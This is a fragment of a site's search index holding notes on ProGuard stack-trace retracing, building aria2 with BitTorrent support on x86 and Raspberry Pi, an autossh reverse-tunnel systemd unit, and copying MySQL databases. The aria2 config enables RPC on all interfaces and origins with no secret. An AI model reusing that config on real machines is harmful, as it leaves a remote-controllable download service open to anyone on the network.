\u5176\u5b9e\uff0c\u6211\u4eec\u65e2\u7136\u53ef\u4ee5\u9002\u5e94ProGuad\u8fdb\u884c\u6df7\u6dc6\uff0c\u90a3\u4e48\u5e94\u8be5\u53ef\u4ee5\u60f3\u5230\u53ef\u4ee5\u53cd\u6df7\u6dc6\u56de\u6765\u3002\u518d\u4f7f\u7528ProGuard\u6df7\u6dc6\u4ee3\u7801\u6253\u5305\u7684\u65f6\u5019\uff0c\u4f1a\u751f\u751f\u4e00\u4e2amapping.txt\u6587\u4ef6\u3002\u8fd9\u4e2a\u6587\u4ef6\u8bb0\u5f55\u4e86\u6df7\u6dc6\u524d\u540e\u7684\u7c7b\u3001\u65b9\u6cd5\u7b49\u6620\u5c04\u5173\u7cfb\u3002\u901a\u8fc7{sdk-dir}\\tools\\proguard\\bin\u76ee\u5f55\u4e0b\u7684retrace.bat\u5de5\u5177\u53cd\u6df7\u6dc6\uff0c\u6267\u884c\u547d\u4ee4\uff1aretract.bat -verbose mapping.txt obfuscated_tract.txt > out_tract.txt\u3002\u7ed3\u679c\u8f93\u51fa\u5982\u4e0b\uff1a java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0 at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:255) at java.util.ArrayList.get(ArrayList.java:308) at com.example.atom.hotel.delegate.HotelListDelegateAdapter.void initSpecialPreferentialTips(boolean)(SourceFile:66) at com.example.atom.hotel.delegate.HotelListDelegateAdapter.<init>(SourceFile:60) \u65b0\u6280\u672f\uff0c\u65b0\u672a\u6765\uff01\u6b22\u8fce\u5927\u5bb6\u5173\u6ce8 \u201c1024\u5de5\u573a\u201d\u5fae\u4fe1\u670d\u52a1\u53f7 \uff0c\u65f6\u523b\u5173\u6ce8\u6211\u4eec\u7684\u6700\u65b0\u7684\u6280\u672f\u8baf\u606f\uff01 \uff08\u752d\u5ba2\u6c14\uff01\u5c3d\u60c5\u7684\u626b\u63cf\u6216\u8005\u957f\u6309\uff01\uff09 \ufeff\ufeff \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/p106786860/article/details/11974863","title":"\u4e94\u3001\u53cd\u6df7\u6dc6\u5d29\u6e83\u65e5\u5fd7"},{"location":"Bash/","text":"","title":"Bash"},{"location":"Python/","text":"","title":"Python"},{"location":"RPI/Aria2%20%E7%BC%96%E8%AF%91%20%E6%B7%BB%E5%8A%A0%E6%94%AF%E6%8C%81BT%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%88X86%E5%92%8Carmhf%E7%9A%84%E6%A0%91%E8%8E%93%E6%B4%BE2%EF%BC%89/","text":"Aria2 \u7f16\u8bd1 \u6dfb\u52a0\u652f\u6301BT\u4e0b\u8f7d\u7684\u529f\u80fd\uff08X86\u548carmhf\u7684\u6811\u8393\u6d3e2\uff09 Aria2 \u6e90\u7801\u4e0b\u8f7d\u5730\u5740 http://sourceforge.net/projects/aria2/files/stable/ \u4e2a\u4eba\u8ba4\u4e3a 1.16.5 \u548c 1.17.1 \u6bd4 1.18 1.19 \u7a33\u5b9a\u5f88\u591a\uff0c\u6682\u65f6\u4e0d\u5efa\u8bae\u9ad8\u7248\u672c\u7f16\u8bd1 \u5176\u5b9e\u53e6\u4e00\u8bf4\u662f\u8981\u770b\u4f60\u7cfb\u7edf \u5982\u679c\u662f\u8001\u673a\u5668\u88c5\u7684\u65e7\u7cfb\u7edf\u5c31\u8001\u8001\u5b9e\u5b9e\u7528\u4f4e\u7248\u672c\uff0c\u4e0d\u8fc7\u8981\u662f\u4f4e\u4e8e1.16+ \u5c31\u4e0d\u5982\u7528\u8f6f\u4ef6\u6e90\u81ea\u5df1\u5e26\u7684\u7248\u672c \u6ca1\u5fc5\u8981\u81ea\u5df1\u8d39\u5c3d\u7f16\u8bd1\u4e86 tar zxvf aria2-1.17.tar.gz cd aria2-1.17.1 sudo ./configure ARIA2_STATIC=yes --enable-bittorrent --enable-metalink \u90e8\u5206\u673a\u5668\u8c8c\u4f3c\u53ef\u4ee5\u7f16\u8bd1 \u4f46\u662f\u4e0d\u80fdmake \u90a3\u5c31\u8003\u8651\u5220\u6389 ARIA2_STATIC=yes sudo ./configure --enable-bittorrent --enable-metalink \u9700\u8981\u7684lib sudo apt-get install gcc c++ autoconf automake libcppunit-dev autopoint openssl libtool sphinx-common sphinxsearch libgcrypt11-dev libxml2-dev pkg-config --enable-bittorrent --enable-metalink \u6dfb\u52a0BT\u548c\u78c1\u529b\u94fe\u7684\u652f\u6301 ubuntu 10.04.4 512M\u5185\u5b58 AMD LX800\u4f4e\u529f\u8017\u4e3b\u673a \u4e3b\u9891500MHz\u4e0a\u9762\u7684\u7f16\u8bd1\u7ed3\u679c configure: summary of build options: version: 0.1.1 shared 0:0:0 Host type: i586-pc-linux-gnu Install prefix: /usr/local C compiler: gcc CFlags: -g -O2 Library types: Shared=yes, Static=yes CUnit: no Build: i586-pc-linux-gnu Host: i586-pc-linux-gnu Target: i586-pc-linux-gnu Install prefix: /usr/local CC: gcc CXX: g++ CPP: gcc -E CXXFLAGS: -g -O2 CFLAGS: -g -O2 CPPFLAGS: -I$(top_builddir)/deps/wslay/lib/includes -I$(top_srcdir)/deps/wslay/lib/includes -I/usr/include/libxml2 LDFLAGS: -all-static -static-libgcc -static-libstdc++ LIBS: -lrt -lgcrypt -lxml2 -lz -lpthread -ldl -lrt DEFS: -DHAVE_CONFIG_H LibUV: no SQLite3: no SSL Support: AppleTLS: GnuTLS: no OpenSSL: no CA Bundle: LibXML2: yes LibExpat: LibCares: no Zlib: yes Epoll: yes Bittorrent: yes Metalink: yes XML-RPC: yes Message Digest: yes WebSocket: yes Libaria2: no bash_completion dir: ${datarootdir}/doc/${PACKAGE_TARNAME}/bash_completion Static build: yes \u6811\u8393\u6d3e2 Arm 4\u6838 1G\u5185\u5b58 \u4e3b\u9891 900MHz Ubuntu mate 15.04 vivid configure: summary of build options: version: 0.1.1 shared 0:0:0 Host type: armv7l-unknown-linux-gnueabihf Install prefix: /usr/local C compiler: gcc CFlags: -g -O2 Library types: Shared=yes, Static=yes CUnit: no Build: armv7l-unknown-linux-gnueabihf Host: armv7l-unknown-linux-gnueabihf Target: armv7l-unknown-linux-gnueabihf Install prefix: /usr/local CC: gcc CXX: g++ CPP: gcc -E CXXFLAGS: -g -O2 CFLAGS: -g -O2 CPPFLAGS: -I$(top_builddir)/deps/wslay/lib/includes -I$(top_srcdir)/deps/wslay/lib/includes -I/usr/include/libxml2 LDFLAGS: LIBS: -lgcrypt -lxml2 DEFS: -DHAVE_CONFIG_H LibUV: no SQLite3: no SSL Support: AppleTLS: GnuTLS: no OpenSSL: no CA Bundle: LibXML2: yes LibExpat: LibCares: no Zlib: no Epoll: yes Bittorrent: yes Metalink: yes XML-RPC: yes Message Digest: yes WebSocket: yes Libaria2: no bash_completion dir: ${datarootdir}/doc/${PACKAGE_TARNAME}/bash_completion Static build: \u540c\u65f6\u653e\u4e0a\u6811\u8393\u6d3e2 Ubuntu mate 15.04 vivid \u7684\u8f6f\u4ef6\u6e90 deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-updates main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-security main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-backports main restricted universe multiverse \u8fd9\u4e2a\u6bd4\u81ea\u5e26\u7684\u8f6f\u4ef6\u6e90\u5feb\u5f88\u591a 400k \u548c 50k \u4e0b\u8f7d\u901f\u5ea6\u7684\u5dee\u8ddd Bittorrent: yes Metalink: yes Static build: yes \u9ed8\u8ba4\u8fd9\u4e9b\u90fd\u662fno\uff0c\u4e5f\u5c31\u662f\u4e0d\u652f\u6301\u7684\u610f\u601d coufigure\u4e4b\u540e\u5c31\u662fmake\u548c\u5b89\u88c5\u4e86\uff0c\u5efa\u8bae\u5148\u5378\u4e86\u81ea\u5e26\u7684 sudo apt-get remove aria2 \u7136\u540e\u5728\u4f7f\u7528\u81ea\u5df1\u7684\u7f16\u8bd1\u7248\u672c sudo make sudo make install \u975e\u5e38\u65e0\u8bed\u7684\u662f\u672c\u6765\u5c313M\u591a\u7684\u6e90\u7801\u7f16\u8bd1\u4e86\u4ee5\u540e\u8981\u51e0\u767eM \u6811\u8393\u6d3e2 \u8fd8\u597d 4\u6838\u7f16\u8bd1\u901f\u5ea6\u4f9d\u65e7\u8fd8\u662f\u5f88\u6162\uff0c\u6ca1\u611f\u89c9\u80fd\u6bd4\u4f4e\u4e3b\u9891\u7684X86cpu\u5feb \u9644\u5e26 aria2 \u914d\u7f6e\u6587\u4ef6 enable-rpc=true rpc-allow-origin-all=true rpc-listen-all=true rpc-listen-port=6800 #event-poll=select disable-ipv6=true max-concurrent-downloads=2 continue=true max-connection-per-server=5 min-split-size=10M split=5 max-overall-download-limit=0 max-download-limit=0 max-overall-upload-limit=15k max-upload-limit=15k #lowest-speed-limit=0 #referer=* input-file=/etc/aria2/session.txt save-session=/etc/aria2/session.txt save-session-interval=30 dir=/nas/aria2 disk-cache=16M enable-mmap=true file-allocation=none force-save=true follow-torrent=true bt-hash-check-seed=true bt-seed-unverified=true bt-save-metadata=true #bt-request-peer-speed-limit=2M bt-save-metadata=true #seed-time=10 seed-ratio=0.1 log=/etc/aria2/aria2.log log-level=error max-download-result=50 \u542f\u52a8\u811a\u672c\u4fdd\u5b58\u5728 /etc/init.d/aria2 #!/bin/sh ### BEGIN INIT INFO # Provides: aria2 # Required-Start: # Required-Stop: # Default-Start: # Default-Stop: # Short-Description: aria2 ### END INIT INFO case $1 in start) touch /etc/aria2/session.txt /usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf -D ;; stop) killall aria2c ;; *) echo \"Usage: /etc/init.d/aria2 {start|stop}\" exit 1 ;; esac exit 0 \u589e\u52a0\u542f\u52a8\u9879 \u5f15\u7528sudo update-rc.d aria2 defaults \u8fd9\u5c31\u662f\u4e3a\u561b\u7f16\u8bd1\u7684\u4e4b\u540e\u7684aria2\u6ca1\u6709BT\u4e0b\u8f7d\u529f\u80fd\u7684\u539f\u56e0\uff0c\u8c8c\u4f3c\u8fd9\u73a9\u610f\u4e0d\u52a0\u53c2\u6570\u4e0d\u7f16\u8bd1\u6210\u53ef\u7528 \u539f\u6587\u94fe\u63a5\uff1a https://www.iteye.com/blog/happysoul-2218060","title":"Aria2 \u7f16\u8bd1 \u6dfb\u52a0\u652f\u6301BT\u4e0b\u8f7d\u7684\u529f\u80fd\uff08X86\u548carmhf\u7684\u6811\u8393\u6d3e2\uff09"},{"location":"RPI/Aria2%20%E7%BC%96%E8%AF%91%20%E6%B7%BB%E5%8A%A0%E6%94%AF%E6%8C%81BT%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%88X86%E5%92%8Carmhf%E7%9A%84%E6%A0%91%E8%8E%93%E6%B4%BE2%EF%BC%89/#aria2-btx86armhf2","text":"Aria2 \u6e90\u7801\u4e0b\u8f7d\u5730\u5740 http://sourceforge.net/projects/aria2/files/stable/ \u4e2a\u4eba\u8ba4\u4e3a 1.16.5 \u548c 1.17.1 \u6bd4 1.18 1.19 \u7a33\u5b9a\u5f88\u591a\uff0c\u6682\u65f6\u4e0d\u5efa\u8bae\u9ad8\u7248\u672c\u7f16\u8bd1 \u5176\u5b9e\u53e6\u4e00\u8bf4\u662f\u8981\u770b\u4f60\u7cfb\u7edf \u5982\u679c\u662f\u8001\u673a\u5668\u88c5\u7684\u65e7\u7cfb\u7edf\u5c31\u8001\u8001\u5b9e\u5b9e\u7528\u4f4e\u7248\u672c\uff0c\u4e0d\u8fc7\u8981\u662f\u4f4e\u4e8e1.16+ \u5c31\u4e0d\u5982\u7528\u8f6f\u4ef6\u6e90\u81ea\u5df1\u5e26\u7684\u7248\u672c \u6ca1\u5fc5\u8981\u81ea\u5df1\u8d39\u5c3d\u7f16\u8bd1\u4e86 tar zxvf aria2-1.17.tar.gz cd aria2-1.17.1 sudo ./configure ARIA2_STATIC=yes --enable-bittorrent --enable-metalink \u90e8\u5206\u673a\u5668\u8c8c\u4f3c\u53ef\u4ee5\u7f16\u8bd1 \u4f46\u662f\u4e0d\u80fdmake \u90a3\u5c31\u8003\u8651\u5220\u6389 ARIA2_STATIC=yes sudo ./configure --enable-bittorrent --enable-metalink \u9700\u8981\u7684lib sudo apt-get install gcc c++ autoconf automake libcppunit-dev autopoint openssl libtool sphinx-common sphinxsearch libgcrypt11-dev libxml2-dev pkg-config --enable-bittorrent --enable-metalink \u6dfb\u52a0BT\u548c\u78c1\u529b\u94fe\u7684\u652f\u6301 ubuntu 10.04.4 512M\u5185\u5b58 AMD LX800\u4f4e\u529f\u8017\u4e3b\u673a \u4e3b\u9891500MHz\u4e0a\u9762\u7684\u7f16\u8bd1\u7ed3\u679c configure: summary of build options: version: 0.1.1 shared 0:0:0 Host type: i586-pc-linux-gnu Install prefix: /usr/local C compiler: gcc CFlags: -g -O2 Library types: Shared=yes, Static=yes CUnit: no Build: i586-pc-linux-gnu Host: i586-pc-linux-gnu Target: i586-pc-linux-gnu Install prefix: /usr/local CC: gcc CXX: g++ CPP: gcc -E CXXFLAGS: -g -O2 CFLAGS: -g -O2 CPPFLAGS: -I$(top_builddir)/deps/wslay/lib/includes -I$(top_srcdir)/deps/wslay/lib/includes -I/usr/include/libxml2 LDFLAGS: -all-static -static-libgcc -static-libstdc++ LIBS: -lrt -lgcrypt -lxml2 -lz -lpthread -ldl -lrt DEFS: -DHAVE_CONFIG_H LibUV: no SQLite3: no SSL Support: AppleTLS: GnuTLS: no OpenSSL: no CA Bundle: LibXML2: yes LibExpat: LibCares: no Zlib: yes Epoll: yes Bittorrent: yes Metalink: yes XML-RPC: yes Message Digest: yes WebSocket: yes Libaria2: no bash_completion dir: ${datarootdir}/doc/${PACKAGE_TARNAME}/bash_completion Static build: yes \u6811\u8393\u6d3e2 Arm 4\u6838 1G\u5185\u5b58 \u4e3b\u9891 900MHz Ubuntu mate 15.04 vivid configure: summary of build options: version: 0.1.1 shared 0:0:0 Host type: armv7l-unknown-linux-gnueabihf Install prefix: /usr/local C compiler: gcc CFlags: -g -O2 Library types: Shared=yes, Static=yes CUnit: no Build: armv7l-unknown-linux-gnueabihf Host: armv7l-unknown-linux-gnueabihf Target: armv7l-unknown-linux-gnueabihf Install prefix: /usr/local CC: gcc CXX: g++ CPP: gcc -E CXXFLAGS: -g -O2 CFLAGS: -g -O2 CPPFLAGS: -I$(top_builddir)/deps/wslay/lib/includes -I$(top_srcdir)/deps/wslay/lib/includes -I/usr/include/libxml2 LDFLAGS: LIBS: -lgcrypt -lxml2 DEFS: -DHAVE_CONFIG_H LibUV: no SQLite3: no SSL Support: AppleTLS: GnuTLS: no OpenSSL: no CA Bundle: LibXML2: yes LibExpat: LibCares: no Zlib: no Epoll: yes Bittorrent: yes Metalink: yes XML-RPC: yes Message Digest: yes WebSocket: yes Libaria2: no bash_completion dir: ${datarootdir}/doc/${PACKAGE_TARNAME}/bash_completion Static build: \u540c\u65f6\u653e\u4e0a\u6811\u8393\u6d3e2 Ubuntu mate 15.04 vivid \u7684\u8f6f\u4ef6\u6e90 deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-updates main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-security main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-backports main restricted universe multiverse \u8fd9\u4e2a\u6bd4\u81ea\u5e26\u7684\u8f6f\u4ef6\u6e90\u5feb\u5f88\u591a 400k \u548c 50k \u4e0b\u8f7d\u901f\u5ea6\u7684\u5dee\u8ddd Bittorrent: yes Metalink: yes Static build: yes \u9ed8\u8ba4\u8fd9\u4e9b\u90fd\u662fno\uff0c\u4e5f\u5c31\u662f\u4e0d\u652f\u6301\u7684\u610f\u601d coufigure\u4e4b\u540e\u5c31\u662fmake\u548c\u5b89\u88c5\u4e86\uff0c\u5efa\u8bae\u5148\u5378\u4e86\u81ea\u5e26\u7684 sudo apt-get remove aria2 \u7136\u540e\u5728\u4f7f\u7528\u81ea\u5df1\u7684\u7f16\u8bd1\u7248\u672c sudo make sudo make install \u975e\u5e38\u65e0\u8bed\u7684\u662f\u672c\u6765\u5c313M\u591a\u7684\u6e90\u7801\u7f16\u8bd1\u4e86\u4ee5\u540e\u8981\u51e0\u767eM \u6811\u8393\u6d3e2 \u8fd8\u597d 4\u6838\u7f16\u8bd1\u901f\u5ea6\u4f9d\u65e7\u8fd8\u662f\u5f88\u6162\uff0c\u6ca1\u611f\u89c9\u80fd\u6bd4\u4f4e\u4e3b\u9891\u7684X86cpu\u5feb \u9644\u5e26 aria2 \u914d\u7f6e\u6587\u4ef6 enable-rpc=true rpc-allow-origin-all=true rpc-listen-all=true rpc-listen-port=6800 #event-poll=select disable-ipv6=true max-concurrent-downloads=2 continue=true max-connection-per-server=5 min-split-size=10M split=5 max-overall-download-limit=0 max-download-limit=0 max-overall-upload-limit=15k max-upload-limit=15k #lowest-speed-limit=0 #referer=* input-file=/etc/aria2/session.txt save-session=/etc/aria2/session.txt save-session-interval=30 dir=/nas/aria2 disk-cache=16M enable-mmap=true file-allocation=none force-save=true follow-torrent=true bt-hash-check-seed=true bt-seed-unverified=true bt-save-metadata=true #bt-request-peer-speed-limit=2M bt-save-metadata=true #seed-time=10 seed-ratio=0.1 log=/etc/aria2/aria2.log log-level=error max-download-result=50 \u542f\u52a8\u811a\u672c\u4fdd\u5b58\u5728 /etc/init.d/aria2 #!/bin/sh ### BEGIN INIT INFO # Provides: aria2 # Required-Start: # Required-Stop: # Default-Start: # Default-Stop: # Short-Description: aria2 ### END INIT INFO case $1 in start) touch /etc/aria2/session.txt /usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf -D ;; stop) killall aria2c ;; *) echo \"Usage: /etc/init.d/aria2 {start|stop}\" exit 1 ;; esac exit 0 \u589e\u52a0\u542f\u52a8\u9879 \u5f15\u7528sudo update-rc.d aria2 defaults \u8fd9\u5c31\u662f\u4e3a\u561b\u7f16\u8bd1\u7684\u4e4b\u540e\u7684aria2\u6ca1\u6709BT\u4e0b\u8f7d\u529f\u80fd\u7684\u539f\u56e0\uff0c\u8c8c\u4f3c\u8fd9\u73a9\u610f\u4e0d\u52a0\u53c2\u6570\u4e0d\u7f16\u8bd1\u6210\u53ef\u7528 \u539f\u6587\u94fe\u63a5\uff1a https://www.iteye.com/blog/happysoul-2218060","title":"Aria2 \u7f16\u8bd1 \u6dfb\u52a0\u652f\u6301BT\u4e0b\u8f7d\u7684\u529f\u80fd\uff08X86\u548carmhf\u7684\u6811\u8393\u6d3e2\uff09"},{"location":"RPI/Autossh%20and%20Systemd%20Service/","text":"Autossh and Systemd Service Several months ago, I wrote a post to describe how to setup an autossh daemon with upstart . Since Ubuntu 15.04 has switched to systemd , I would like to do the same with systemd . I will give a brief introduction to systemd in this post. Systemd Unit File Systemd services are configured by unit files . By convention, these files use .service as their file name extension. On Ubuntu, there are two directories for unit files : /lib/systemd -- This is the directory for unit files provided by the installed packages. /etc/systemd -- This is the directory for the administrators to create, override, modify or mask the unit files in /lib/systemd . Although the autossh package does not come with any unit file, we can create one in /lib/systemd : $ sudo vim /lib/systemd/system/autossh.service Here's the content of the unit file: [Unit] Description=autossh Wants=network-online.target After=network-online.target [Service] Type=simple User=autossh EnvironmentFile=/etc/default/autossh ExecStart= ExecStart=/usr/bin/autossh $SSH_OPTIONS Restart=always RestartSec=60 [Install] WantedBy=multi-user.target Some explanations to the options: Description= contains some words that can describe the service. This will show up in the logs. Wants= specifies the dependencies of the services. If this service is activated, systemd will also activate the listed services. In our case, we would like to make sure that the network interface is ready, thus we specified network-online.target [1] . * After= specifies the order to launch the service. With the After option, systemd will only launch the service after the activation of listed services. Notice that this option is orthogonal to Wants (or Requires .) If After is not specified, systemd may launch the dependencies simultaneously. * Type= specifies the type of the service. There are several options: simple, fork, oneshot, and etc. + A **simple** service will contain one long running process. The process will not stop unless we kill the service. + A **fork** service means that the `ExecStart` command will fork a subprocess and return immediately. In the other words, the command will manage the process by themselves. + An **oneshot** service will launch a new process whenever an event triggers this service. User= specifies the user as whom the service process is run. By default, the process is run as root . EnvironmentFile= specifies the path to an environment file, which contains the environment variables for the service process. ExecStart= specifies the command to launch the service. We have to specify the full path to the executable to be executed. Notice that there are two ExecStart in our unit file. They are not typos. In order to allow this unit file to be included by another unit file, we have to clear ExecStart before specifying a new command. * WantedBy= specifies the init stage to launch the service (if the service is enabled.) Now, we can create a soft link in /etc/systemd/system : $ sudo ln -s /lib/systemd/system/autossh.service \\ /etc/systemd/system/autossh.service Environment File Did you notice that there is a variable $SSH_OPTIONS in the ExecStart option above? It will be substituted by the environment variable from the file specified by EnvironmentFile . Environment files are the files which contain the configurations which should be passed to the service. Let's create an environment file: $ sudo vim /etc/default/autossh The environment file resembles to a Bash script. Here's the example for our autossh service: AUTOSSH_POLL=60 AUTOSSH_FIRST_POLL=30 AUTOSSH_GATETIME=0 AUTOSSH_PORT=22000 SSH_OPTIONS=\"-N -R 2222:localhost:22 example.com -i /home/autossh/.ssh/id_rsa\" We can find more options by reading autossh man pages. Start the Service Before we can start our service, we have to ask systemd to reload all unit files: $ sudo systemctl daemon-reload Now, we can start autossh service with: $ sudo systemctl start autossh And then, we can check the status with: $ sudo systemctl status autossh With this command, you should be able to see the following output (if the unit file is correct): * autossh.service - autossh Loaded: loaded (/lib/systemd/system/autossh.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2015-11-15 22:51:25 CST; 1min 1s ago Main PID: 14382 (autossh) CGroup: /system.slice/autossh.service |-14382 /usr/lib/autossh/autossh -N -R 8022:localhost:22 .... `-14385 /usr/bin/ssh -L ... If there are some problems, check /var/log/syslog for more details. BTW, to stop the service, we can use the following command: $ sudo systemctl stop autossh Launch Service at Boot Time OK. If everything goes well, then we may ask systemd to launch our service during the boot time. To do so, we have to enable the service with: $ sudo systemctl enable autossh Conclusion In this post, I have covered some basic concept of systemd unit files and basic commands to control systemd : Reload unit files with sudo systemctl daemon-reload Start/stop service with: sudo systemctl [start/stop] [name] Check service status with: sudo systemctl status [name] Register/unregister the service for the boot time with: sudo systemctl [enable/disable] [name] Hope you enjoy this article. Reference Wikipedia: systemd Arch Linux wiki: systemd Ubuntu wiki: systemd for upstart users RedHat RHEL7: System Administrator's Guide: Chapter 8 Systemd Manuals : systemd.unit and systemd.service . Running Services After the Network is up | [1] | It is non-trivial to write an unit file for the service that requires network connections, read Running Services After the Network is up for more details. | \u539f\u6587\u94fe\u63a5\uff1a http://logan.tw/posts/2015/11/15/autossh-and-systemd-service/","title":"Autossh and Systemd Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#autossh-and-systemd-service","text":"Several months ago, I wrote a post to describe how to setup an autossh daemon with upstart . Since Ubuntu 15.04 has switched to systemd , I would like to do the same with systemd . I will give a brief introduction to systemd in this post.","title":"Autossh and Systemd Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#systemd-unit-file","text":"Systemd services are configured by unit files . By convention, these files use .service as their file name extension. On Ubuntu, there are two directories for unit files : /lib/systemd -- This is the directory for unit files provided by the installed packages. /etc/systemd -- This is the directory for the administrators to create, override, modify or mask the unit files in /lib/systemd . Although the autossh package does not come with any unit file, we can create one in /lib/systemd : $ sudo vim /lib/systemd/system/autossh.service Here's the content of the unit file: [Unit] Description=autossh Wants=network-online.target After=network-online.target [Service] Type=simple User=autossh EnvironmentFile=/etc/default/autossh ExecStart= ExecStart=/usr/bin/autossh $SSH_OPTIONS Restart=always RestartSec=60 [Install] WantedBy=multi-user.target Some explanations to the options: Description= contains some words that can describe the service. This will show up in the logs. Wants= specifies the dependencies of the services. If this service is activated, systemd will also activate the listed services. In our case, we would like to make sure that the network interface is ready, thus we specified network-online.target [1] . * After= specifies the order to launch the service. With the After option, systemd will only launch the service after the activation of listed services. Notice that this option is orthogonal to Wants (or Requires .) If After is not specified, systemd may launch the dependencies simultaneously. * Type= specifies the type of the service. There are several options: simple, fork, oneshot, and etc. + A **simple** service will contain one long running process. The process will not stop unless we kill the service. + A **fork** service means that the `ExecStart` command will fork a subprocess and return immediately. In the other words, the command will manage the process by themselves. + An **oneshot** service will launch a new process whenever an event triggers this service. User= specifies the user as whom the service process is run. By default, the process is run as root . EnvironmentFile= specifies the path to an environment file, which contains the environment variables for the service process. ExecStart= specifies the command to launch the service. We have to specify the full path to the executable to be executed. Notice that there are two ExecStart in our unit file. They are not typos. In order to allow this unit file to be included by another unit file, we have to clear ExecStart before specifying a new command. * WantedBy= specifies the init stage to launch the service (if the service is enabled.) Now, we can create a soft link in /etc/systemd/system : $ sudo ln -s /lib/systemd/system/autossh.service \\ /etc/systemd/system/autossh.service","title":"Systemd Unit File"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#environment-file","text":"Did you notice that there is a variable $SSH_OPTIONS in the ExecStart option above? It will be substituted by the environment variable from the file specified by EnvironmentFile . Environment files are the files which contain the configurations which should be passed to the service. Let's create an environment file: $ sudo vim /etc/default/autossh The environment file resembles to a Bash script. Here's the example for our autossh service: AUTOSSH_POLL=60 AUTOSSH_FIRST_POLL=30 AUTOSSH_GATETIME=0 AUTOSSH_PORT=22000 SSH_OPTIONS=\"-N -R 2222:localhost:22 example.com -i /home/autossh/.ssh/id_rsa\" We can find more options by reading autossh man pages.","title":"Environment File"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#start-the-service","text":"Before we can start our service, we have to ask systemd to reload all unit files: $ sudo systemctl daemon-reload Now, we can start autossh service with: $ sudo systemctl start autossh And then, we can check the status with: $ sudo systemctl status autossh With this command, you should be able to see the following output (if the unit file is correct): * autossh.service - autossh Loaded: loaded (/lib/systemd/system/autossh.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2015-11-15 22:51:25 CST; 1min 1s ago Main PID: 14382 (autossh) CGroup: /system.slice/autossh.service |-14382 /usr/lib/autossh/autossh -N -R 8022:localhost:22 .... `-14385 /usr/bin/ssh -L ... If there are some problems, check /var/log/syslog for more details. BTW, to stop the service, we can use the following command: $ sudo systemctl stop autossh","title":"Start the Service"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#launch-service-at-boot-time","text":"OK. If everything goes well, then we may ask systemd to launch our service during the boot time. To do so, we have to enable the service with: $ sudo systemctl enable autossh","title":"Launch Service at Boot Time"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#conclusion","text":"In this post, I have covered some basic concept of systemd unit files and basic commands to control systemd : Reload unit files with sudo systemctl daemon-reload Start/stop service with: sudo systemctl [start/stop] [name] Check service status with: sudo systemctl status [name] Register/unregister the service for the boot time with: sudo systemctl [enable/disable] [name] Hope you enjoy this article.","title":"Conclusion"},{"location":"RPI/Autossh%20and%20Systemd%20Service/#reference","text":"Wikipedia: systemd Arch Linux wiki: systemd Ubuntu wiki: systemd for upstart users RedHat RHEL7: System Administrator's Guide: Chapter 8 Systemd Manuals : systemd.unit and systemd.service . Running Services After the Network is up | [1] | It is non-trivial to write an unit file for the service that requires network connections, read Running Services After the Network is up for more details. | \u539f\u6587\u94fe\u63a5\uff1a http://logan.tw/posts/2015/11/15/autossh-and-systemd-service/","title":"Reference"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/","text":"Copying MySQL Databases to Another Machine 2.11.13 Copying MySQL Databases to Another Machine In cases where you need to transfer databases between different architectures, you can use mysqldump to create a file containing SQL statements. You can then transfer the file to the other machine and feed it as input to the mysql client. Use mysqldump --help to see what options are available. The easiest (although not the fastest) way to move a database between two machines is to run the following commands on the machine on which the database is located: mysqladmin -h '*other_hostname*' create *db_name* mysqldump *db_name* | mysql -h '*other_hostname*' *db_name* If you want to copy a database from a remote machine over a slow network, you can use these commands: mysqladmin create *db_name* mysqldump -h '*other_hostname*' --compress *db_name* | mysql *db_name* You can also store the dump in a file, transfer the file to the target machine, and then load the file into the database there. For example, you can dump a database to a compressed file on the source machine like this: mysqldump --quick *db_name* | gzip > *db_name*.gz Transfer the file containing the database contents to the target machine and run these commands there: mysqladmin create *db_name* gunzip < *db_name*.gz | mysql *db_name* You can also use mysqldump and mysqlimport to transfer the database. For large tables, this is much faster than simply using mysqldump . In the following commands, DUMPDIR represents the full path name of the directory you use to store the output from mysqldump . First, create the directory for the output files and dump the database: mkdir *DUMPDIR* mysqldump --tab=*DUMPDIR* *db_name* Then transfer the files in the DUMPDIR directory to some corresponding directory on the target machine and load the files into MySQL there: mysqladmin create *db_name* # create database cat *DUMPDIR*/*.sql | mysql *db_name* # create tables in database mysqlimport *db_name* *DUMPDIR*/*.txt # load data into tables Do not forget to copy the mysql database because that is where the grant tables are stored. You might have to run commands as the MySQL root user on the new machine until you have the mysql database in place. After you import the mysql database on the new machine, execute mysqladmin flush-privileges so that the server reloads the grant table information. Note You can copy the .frm , .MYI , and .MYD files for MyISAM tables between different architectures that support the same floating-point format. (MySQL takes care of any byte-swapping issues.) See Section 15.2, \u201cThe MyISAM Storage Engine\u201d . \u539f\u6587\u94fe\u63a5\uff1a https://dev.mysql.com/doc/refman/5.7/en/copying-databases.html","title":"Copying MySQL Databases to Another Machine"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/#copying-mysql-databases-to-another-machine","text":"","title":"Copying MySQL Databases to Another Machine"},{"location":"RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/#21113-copying-mysql-databases-to-another-machine","text":"In cases where you need to transfer databases between different architectures, you can use mysqldump to create a file containing SQL statements. You can then transfer the file to the other machine and 